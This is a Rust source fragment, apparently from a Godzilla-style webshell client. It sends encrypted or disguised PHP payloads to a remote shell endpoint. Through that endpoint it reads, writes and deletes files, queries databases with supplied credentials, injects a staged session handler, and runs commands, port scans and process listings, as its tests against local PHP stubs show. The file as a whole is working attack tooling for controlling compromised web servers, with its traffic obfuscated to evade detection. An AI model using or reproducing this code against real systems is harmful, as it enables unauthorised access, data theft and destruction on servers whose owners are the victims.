            return self.session_read_file(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "read_file",
            php.encoder,
        )?;

        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_write_file(php, path, content, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$r=@file_put_contents($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "write_file",
            php.encoder,
        )?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_delete(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "delete",
            php.encoder,
        )?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_rename(php, from, to, settings);
        }
        let from_b64 = B64.encode(from.as_bytes());
        let to_b64 = B64.encode(to.as_bytes());
        let code = format!(
            "{}\n$f=base64_decode('{from_b64}');$t=base64_decode('{to_b64}');$r=@rename($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "rename",
            php.encoder,
        )?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_mkdir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "mkdir",
            php.encoder,
        )?;
        Ok(())
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_touch(php, path, timestamp, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let ts = timestamp.to_string();
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$r=@touch($p,{ts});if($r===false){{$__r=array('ok'=>false,'error'=>'touch 失败（路径不存在或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "touch",
            php.encoder,
        )?;
        Ok(())
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
            len = length,
        );
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "read_chunk",
            php.encoder,
        )?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$off={off};$mode=($off>0&&@file_exists($p))?'r+b':'w+b';$f=@fopen($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@fseek($f,$off)>=0);if($ok){{@fwrite($f,$d);}}@fclose($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
        );
        self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "write_chunk",
            php.encoder,
        )?;
        Ok(())
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_db_probe(php, connection, settings);
        }
        let driver = connection.driver.clone();
        let dsn = build_dsn(connection, false)?;
        let list_dbs = match driver.as_str() {
            "mysql" => "SHOW DATABASES".to_string(),
            "pgsql" => "SELECT datname FROM pg_database".to_string(),
            _ => String::new(),
        };
        let code = Self::build_code(
            DB_PROBE_CODE,
            &[
                ("PARAM_K", encoder_form_key(php.encoder)),
                (
                    "PWD",
                    &crate::protocol::transport::php_single_quote(&php.password),
                ),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("LIST_DBS", &B64.encode(list_dbs.as_bytes())),
                ("DBNAME", &B64.encode(conn_dbname(connection))),
                ("DRIVER", &driver),
            ],
        );
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "db_probe",
            php.encoder,
        )?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver,
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_db_query(php, connection, sql, settings);
        }
        let dsn = build_dsn(connection, true)?;
        let code = Self::build_code(
            DB_QUERY_CODE,
            &[
                ("PARAM_K", encoder_form_key(php.encoder)),
                (
                    "PWD",
                    &crate::protocol::transport::php_single_quote(&php.password),
                ),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("SQL", &B64.encode(sql.as_bytes())),
            ],
        );
        let start = Instant::now();
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "db_query",
            php.encoder,
        )?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms,
        })
    }
}

/// 编码器的密码参数名（业务伪装模板为 token）。
fn encoder_form_key(encoder: &dyn PayloadEncoder) -> &'static str {
    let (key_param, _) = encoder.form_params();
    key_param
}

/// 校验驱动白名单并构造 PDO DSN。
/// `use_db` 为 true 时把 dbname 并入 DSN（查询语句需要选定数据库）。
fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, ProtocolError> {
    if !DB_DRIVERS.contains(&connection.driver.as_str()) {
        return Err(ProtocolError::NotSupported(format!(
            "不支持的数据库驱动：{}（支持 mysql / pgsql / sqlite）",
            connection.driver
        )));
    }
    let host = connection.host.as_deref().unwrap_or("");
    let port = connection.port.unwrap_or_else(|| {
        if connection.driver == "pgsql" {
            5432
        } else {
            3306
        }
    });
    let dbname = connection.dbname.as_deref().unwrap_or("");
    match connection.driver.as_str() {
        "sqlite" => {
            if dbname.is_empty() {
                return Err(ProtocolError::ServerError(
                    "SQLite 模式需要在「数据库」字段填写目标文件路径".into(),
                ));
            }
            Ok(format!("sqlite:{dbname}"))
        }
        "mysql" => {
            let mut dsn = format!("mysql:host={host};port={port};charset=utf8mb4");
            if use_db && !dbname.is_empty() {
                dsn.push_str(&format!(";dbname={dbname}"));
            }
            Ok(dsn)
        }
        _ => {
            let db = if dbname.is_empty() {
                "postgres"
            } else {
                dbname
            };
            Ok(format!("pgsql:host={host};port={port};dbname={db}"))
        }
    }
}

// ---------------------------------------------------------------------------
// Godzilla 分阶段载荷（xor_session）客户端通道
// ---------------------------------------------------------------------------

/// 是否启用分发通道（分阶段载荷 session 模式 或 NATIVE 内置分发）。
fn is_session(php: &PhpSession) -> bool {
    php.session_mode || is_native(php)
}

/// JSON 字符串值转义。
/// 从 probe 响应提取哥斯拉风格环境详情键值。
fn info_map(value: &serde_json::Value) -> std::collections::HashMap<String, String> {
    value
        .pointer("/data/info")
        .and_then(|v| v.as_object())
        .map(|obj| {
            obj.iter()
                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                .collect()
        })
        .unwrap_or_default()
}

/// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
fn session_post(
    php: &PhpSession,
    body: String,
    settings: &AppSettings,
) -> Result<Vec<u8>, ProtocolError> {
    let response = php
        .client
        .post(&php.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    if !response.status().is_success() {
        return Err(ProtocolError::HttpStatus(
            response.status().as_u16(),
            response
                .status()
                .canonical_reason()
                .unwrap_or("")
                .to_string(),
        ));
    }
    let bytes = response
        .bytes()
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    // 响应为编码器密文（base64 文本），按编码器解密
    let text = String::from_utf8_lossy(&bytes);
    php.encoder.decode(&text, &php.password)
}

/// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), ProtocolError> {
    let mut initialized = php
        .initialized
        .lock()
        .map_err(|_| ProtocolError::ParseError("会话状态锁异常".to_string()))?;
    if *initialized {
        return Ok(());
    }
    let code = dosword_sdk::encoder::session_handler_code();
    let payload = php.encoder.encode(code, &php.password);
    if php.encoder.id().contains("chacha") {
        eprintln!("[init] payload head: {}", &payload[..payload.len().min(40)]);
    }
    let plain = session_post(php, payload, settings)?;
    let text = String::from_utf8_lossy(&plain);
    if !text.contains("ok") {
        return Err(ProtocolError::ServerError(format!(
            "分阶段载荷初始化失败：{text}"
        )));
    }
    *initialized = true;
    Ok(())
}

/// 调用一次处理器操作：参数 JSON（XOR 加密）-> 解密响应 -> nonce 帧解析。
fn session_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    ensure_session_init(php, settings)?;
    let nonce = random_nonce();
    let mut request = format!("{{\"a\":\"{action}\",\"n\":\"{nonce}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    request.push('}');

    // session 变体（分阶段载荷）暂不启用 gzip（响应为明文 JSON，结构不兼容压缩）
    let payload = php.encoder.encode(&request, &php.password);
    let plain = session_post(php, payload, settings)?;
    let text = String::from_utf8_lossy(&plain);

    // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
    let start = text
        .find(&nonce)
        .ok_or_else(|| ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）")))?;
    let tail = &text[start + nonce.len()..];
    let end = tail
        .find(&nonce)
        .ok_or(ProtocolError::ParseError("协议帧不完整".to_string()))?;
    let payload_b64 = &tail[..end];
    let decoded = B64
        .decode(payload_b64)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
    let value: Value = serde_json::from_slice(&decoded)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// NATIVE 编码器通道：POST formData（编码器加密的参数 JSON）+ 自定义头鉴权，
/// 响应为 JSON{data: 编码器密文}，解密后得到结果 JSON。
fn native_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    let mut request = format!("{{\"a\":\"{action}\"");
    for (key, value) in params {
        request.push_str(&format!(",\"{key}\":\"{}\"", json_str(value)));
    }
    request.push('}');

    let payload = php.encoder.encode(&request, &php.password);
    let payload = crate::protocol::transport::gzip_payload(&payload, settings.gzip_enabled);
    // base64 载荷可能含 +/=，必须转义（否则 PHP 表单解析时 + 转空格损坏密文）；
    // P2：手动快速转义（仅 +、=、&），避免对整块载荷全量百分号编码
    let body = format!("formData={}", form_escape(&payload));
    let token = &dosword_sdk::encoder::md5_hex(&php.password)[..16];
    let response = php
        .client
        .post(&php.endpoint)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("X-Debug-Key", token)
        .body(body)
        .send()
        .map_err(|error| ProtocolError::Network(error.to_string()))?;
    if !response.status().is_success() {
        return Err(ProtocolError::HttpStatus(
            response.status().as_u16(),
            response
                .status()
                .canonical_reason()
                .unwrap_or("")
                .to_string(),
        ));
    }
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    let text = String::from_utf8_lossy(&bytes);
    let outer: Value = serde_json::from_str(&text)
        .map_err(|_| ProtocolError::ParseError("响应不是合法 JSON".to_string()))?;
    let data = outer
        .get("data")
        .and_then(|v| v.as_str())
        .ok_or_else(|| ProtocolError::ParseError("响应缺少 data 字段".to_string()))?;
    // gzip：响应若为 gzip 字节则解压后重新 base64（stub 端 gzencode 兜底）
    let data = crate::protocol::transport::gunzip_if_needed(data);
    let plain = php.encoder.decode(&data, &php.password)?;
    let value: Value = serde_json::from_slice(&plain)
        .map_err(|_| ProtocolError::ParseError("响应内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 是否 NATIVE 分发编码器。
fn is_native(php: &PhpSession) -> bool {
    php.encoder.id().starts_with("native")
}

/// 统一操作分发：NATIVE 走内置功能调用（无 init），其余走分阶段载荷。
fn dispatch(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    if is_native(php) {
        native_call(php, action, params, settings)
    } else {
        session_call(php, action, params, settings)
    }
}

fn conn_json(connection: &DbConnection) -> String {
    serde_json::to_string(connection).unwrap_or_else(|_| "{}".to_string())
}

fn conn_user(connection: &DbConnection) -> String {
    connection.username.as_deref().unwrap_or("").to_string()
}

fn conn_pass(connection: &DbConnection) -> String {
    connection.password.as_deref().unwrap_or("").to_string()
}

fn conn_dbname(connection: &DbConnection) -> String {
    connection.dbname.as_deref().unwrap_or("").to_string()
}

// ---------------------------------------------------------------------------
// 测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use serde_json::json;

    use super::*;
    use dosword_sdk::FeaturePlugin;
    use dosword_sdk::domain::ShellProfile;
    use dosword_sdk::encoder::md5_hex;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
            chunk_size_mb: 4,
            allow_arbitrary_code: true,
            audit_retention_days: 90,
            gzip_enabled: true,
        }
    }

    fn profile(endpoint: &str) -> ShellProfile {
        ShellProfile {
            id: "test".into(),
            workspace_id: "ws".into(),
            name: "t".into(),
            endpoint: endpoint.into(),
            runtime: "php".into(),
            protocol_id: PHP_PROTOCOL_ID.into(),
            status: "unknown".into(),
            last_connected_at: None,
            created_at: "2026-01-01".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            tags: vec![],
        }
    }

    /// 起一个假 PHP 服务器：解析收到的 `k`/`x` 参数，把 (code, k) 通过 channel 上报，
    /// 从代码中提取 nonce，然后用传入的 `respond` 生成 JSON data 包裹进该 nonce 帧回送
    /// （模拟真实 stub 的 echo 行为）。若 `respond` 返回 `None`，则回送明文 AUTH_FAIL。
    #[allow(dead_code)] // 测试基础设施，保留供新增协议用例复用
    fn spawn_fake_server(
        respond: impl Fn(String, String) -> Option<Value> + Send + 'static,
    ) -> (String, std::sync::mpsc::Receiver<(String, String)>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = Vec::new();
                let mut temp = [0u8; 8192];
                loop {
                    match stream.read(&mut temp) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&temp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let request = String::from_utf8_lossy(&buf);
                let body_start = request
                    .find("\r\n\r\n")
                    .map(|i| i + 4)
                    .unwrap_or(request.len());
                let body = &request[body_start.min(request.len())..];

                let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
                    .map(|(k, v)| (k.into_owned(), v.into_owned()))
                    .collect();
                // 支持标准参数（k/x）与业务伪装参数（token/data）
                let param = |name: &str| {
                    params
                        .iter()
                        .find(|(key, _)| key == name)
                        .map(|(_, v)| v.clone())
                        .unwrap_or_default()
                };
                let k = {
                    let k = param("k");
                    let token = param("token");
                    if !k.is_empty() { k } else { token }
                };
                let x = {
                    let x = param("x");
                    let data = param("data");
                    if !x.is_empty() {
                        x
                    } else if !data.is_empty() {
                        data
                    } else if !body.is_empty() {
                        // body 直传模式（php_stream）：整个请求体即载荷
                        body.to_string()
                    } else {
                        String::new()
                    }
                };
                let code = {
                    // 支持多种编码：裸 base64 / XOR / AES-128-ECB / CHAR / OBFUSCATE
                    // （CHAR/OBFUSCATE 不经 base64，stub 直接 eval，先检查原文）
                    if x.contains("array_map('chr',array(") {
                        let numbers = x.rsplit("array(").next().unwrap_or("");
                        let restored: Vec<u8> = numbers
                            .split(')')
                            .next()
                            .unwrap_or("")
                            .split(',')
                            .filter_map(|item| item.trim().parse::<u8>().ok())
                            .collect();
                        String::from_utf8_lossy(&restored).to_string()
                    } else if x.contains("strrev('") {
                        let reversed = x
                            .split("strrev('")
                            .nth(1)
                            .and_then(|part| part.split("')").next())
                            .unwrap_or("");
                        let b64: String = reversed.chars().rev().collect();
                        let restored = B64.decode(&b64).unwrap_or_default();
                        String::from_utf8_lossy(&restored).to_string()
                    } else {
                        let raw = B64.decode(&x).unwrap_or_default();
                        // 8 字节连续特征串，XOR/AES 密文命中概率可忽略
                        let is_plain = raw.windows(8).any(|w| w == b"@ini_set");
                        if is_plain {
                            String::from_utf8_lossy(&raw).to_string()
                        } else {
                            // XOR
                            let key = md5_hex("secret").into_bytes();
                            let mut restored: Vec<u8> = raw
                                .iter()
                                .enumerate()
                                .map(|(index, byte)| byte ^ key[index % key.len()])
                                .collect();
                            if !restored.windows(8).any(|w| w == b"@ini_set") {
                                // AES-128-ECB
                                restored = dosword_sdk::encoder::aes_ecb_decrypt(
                                    &raw,
                                    &dosword_sdk::encoder::aes_key("secret"),
                                )
                                .unwrap_or_default();
                            }
                            String::from_utf8_lossy(&restored).to_string()
                        }
                    }
                };
                let _ = tx.send((k.clone(), code.clone()));

                // 从代码中提取 `echo '{nonce}'` 帧标记
                let nonce = code
                    .split("echo '")
                    .nth(1)
                    .and_then(|part| part.split('\'').next())
                    .unwrap_or("abababab")
                    .to_string();

                let body = match respond(code, k) {
                    Some(data) => {
                        format!("{}{}{}", nonce, B64.encode(json!(data).to_string()), nonce)
                    }
                    None => "AUTH_FAIL".to_string(),
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        (format!("http://{addr}"), rx)
    }

    #[test]
    fn real_php_all_encoders_round_trip() {
        // 每个编码器的生成 stub 都做真实执行验证（防止模板双重调用等 bug 漏网）
        let encoders = [
            "native",
            "native_aes_ecb",
            "native_aes_cbc",
            "native_des",
            "native_chacha20",
            "native_rabbit",
        ];
        let settings = settings();
        for encoder_id in encoders {
            if encoder_id == "native_des" && !php_supports_des_ecb() {
                eprintln!(
                    "跳过 native_des：当前 php 的 OpenSSL 不支持 DES-ECB（OpenSSL 3 需加载 legacy provider）"
                );
                continue;
            }
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
            else {
                eprintln!("跳过 {encoder_id}：未检测到 php 可执行文件");
                continue;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let result = (|| -> Result<String, ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let output =
                    PhpProtocol.execute_command(session.as_ref(), "printf enc-ok", &settings)?;
                Ok(output.stdout)
            })();
            let _ = child.kill();
            let _ = child.wait();
            let stdout = result.unwrap_or_else(|error| {
                let _ = std::fs::copy(
                    dir.join("shell.php"),
                    std::env::temp_dir().join(format!("failed_{encoder_id}.php")),
                );
                panic!("{encoder_id} 真实执行应成功：{error}");
            });
            let _ = std::fs::remove_dir_all(&dir);
            assert_eq!(stdout.trim(), "enc-ok", "{encoder_id} 输出不符");
        }
    }

    #[test]
    fn real_php_session_variants_round_trip() {
        // Godzilla 分阶段载荷应用到所有编码器：每个编码器以 session 模式真实往返
        let encoders = [
            "native",
            "native_aes_ecb",
            "native_aes_cbc",
            "native_des",
            "native_chacha20",
            "native_rabbit",
        ];
        let settings = settings();
        for encoder_id in encoders {
            if encoder_id == "native_des" && !php_supports_des_ecb() {
                eprintln!(
                    "跳过 native_des session：当前 php 的 OpenSSL 不支持 DES-ECB（OpenSSL 3 需加载 legacy provider）"
                );
                continue;
            }
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true)
            else {
                eprintln!("跳过 {encoder_id} session：未检测到 php");
                continue;
            };
            let mut profile = profile(&url);
            // xor_session 编码器本身即 session；其余通过 protocol_params 开启
            if encoder_id == "xor_session" {
                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            } else {
                profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}","session":true}}"#);
            }
            let result = (|| -> Result<String, ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let output =
                    PhpProtocol.execute_command(session.as_ref(), "printf sess-ok", &settings)?;
                Ok(output.stdout)
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            let stdout = result
                .unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
            assert_eq!(stdout.trim(), "sess-ok", "{encoder_id} session 输出不符");
        }
    }

    #[test]
    fn real_php_feature_plugins() {
        // 功能插件真实执行：进程 / 端口扫描 / PHP 环境检测（依赖 run_code 通道）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 通用：进程详情（结构化表格）
            let out = dosword_sdk::feature_plugins::ProcessesPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            let stdout = out["stdout"]
                .as_str()
                .or_else(|| out["data"]["stdout"].as_str())
                .unwrap_or("");
            assert!(!stdout.is_empty(), "进程输出不应为空：{out:?}");
            eprintln!("[plugin] processes stdout 成功返回 {} 字节", stdout.len());
            // 通用：端口扫描（代码通道，扫本机开放端口）
            let scan = dosword_sdk::feature_plugins::PortScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"host": "127.0.0.1", "ports": "80,443,3306,8080,22", "timeout": 1}),
                &settings,
            )?;
            let open = scan["open"].as_array().map(|a| a.len()).unwrap_or(0);
            eprintln!("[plugin] port_scan open={open}");
            // PHP 专用：环境检测
            let env = dosword_sdk::feature_plugins::PhpEnvPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(env["php_version"].as_str().is_some(), "应返回 php_version");
            eprintln!(
                "[plugin] php_env {}",
                env["php_version"].as_str().unwrap_or("")
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("功能插件真实执行应成功：{error}"));
    }

    #[test]
